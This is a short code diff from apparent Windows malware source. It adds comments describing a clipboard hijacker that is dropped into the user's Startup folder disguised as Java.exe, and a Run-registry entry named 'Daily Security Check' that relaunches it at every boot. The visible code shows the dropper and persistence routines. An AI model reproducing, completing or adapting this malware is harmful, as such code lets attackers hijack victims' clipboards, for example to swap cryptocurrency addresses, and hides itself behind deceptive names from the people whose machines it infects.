@@ -10,6 +10,7 @@ std::basic_string<wchar_t> dropPayload() {
     wchar_t userProfile[MAX_PATH];
     if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_PROFILE, nullptr, 0, userProfile))) {
         std::wstring filePath = userProfile;
+        // Clipboard hijacker pretends to be a program called Java.exe
         filePath += L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Java.exe";
         HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
                                    nullptr);
@@ -31,7 +32,6 @@ void regModify(LPCWSTR data) {
     HKEY hKey;
     LONG result;
     DWORD dwType = REG_SZ;
-
     result = RegOpenKeyEx(
             HKEY_CURRENT_USER,
             _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
@@ -39,6 +39,7 @@ void regModify(LPCWSTR data) {
             KEY_ALL_ACCESS,
             &hKey
     );
+    // Register a service called Daily Security Check to autorun everytime when PC restarts
     if (result == ERROR_SUCCESS) {
         RegSetValueExW(
                 hKey,
